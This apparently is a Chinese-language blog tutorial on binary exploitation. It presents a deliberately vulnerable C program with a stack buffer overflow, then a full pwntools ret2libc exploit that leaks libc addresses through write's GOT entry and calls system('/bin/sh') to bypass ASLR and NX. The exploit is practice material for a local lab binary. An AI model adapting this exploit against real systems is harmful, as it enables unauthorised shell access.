---
layout:     post   			        # 使用的布局（不需要改）
title:      从0开始学pwn   			# 标题 
subtitle:   (2)  			#副标题
date:       2019-08-18 				# 时间
author:     pic4xiu 		    		# 作者
header-img: img/post-bg-debug.png 		#这篇文章标题背景图片
catalog: true 					# 是否归档
tags:						#标签
    - pwn
---

今天主要运用rop解决pwn,其中有很多繁杂的知识点我们一起处理一下,源程序还是那个
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
  
void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 256);
}
  
int main(int argc, char** argv) {
    vulnerable_function();
    write(STDOUT_FILENO, "Hello, World\n", 13);
}
```
但是这次开了aslr和nx,所以我们必须把这些东西泄漏出来,,我们直接根据exp来分析.具体操作如下
```
#!/usr/bin/env python
from pwn import *

libc = ELF('libc.so')
elf = ELF('level2')

p = process('./level2')
#p = remote('127.0.0.1', 10003)

plt_write = elf.symbols['write']
print 'plt_write= ' + hex(plt_write)
got_write = elf.got['write']
print 'got_write= ' + hex(got_write)
vulfun_addr = 0x08048404
print 'vulfun= ' + hex(vulfun_addr)

payload1 = 'a'*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(got_write) + p32(4)

print "\n###sending payload1 ...###"
p.send(payload1)

print "\n###receving write() addr...###"
write_addr = u32(p.recv(4))
print 'write_addr=' + hex(write_addr)

print "\n###calculating system() addr and \"/bin/sh\" addr...###"
system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])
print 'system_addr= ' + hex(system_addr)
binsh_addr = write_addr - (libc.symbols['write'] - next(libc.search('/bin/sh')))
print 'binsh_addr= ' + hex(binsh_addr)

payload2 = 'a'*140  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)

print "\n###sending payload2 ...###"
p.send(payload2)

p.interactive()
```
## 纸上谈兵
首先我们根据objdump能搞出来write函数的got和plt表,之后可以利用`plt_write`把`got_write`即真正到内存里的地址泄漏出来,得到`got_write`后我们又有原来的libc,故而能根据偏移找到system和sh的地址,而这个这个程序很简单,我们可以有一个`vulfun_addr`函数不断的跳,也算是一个很好的工具函数

> 完毕
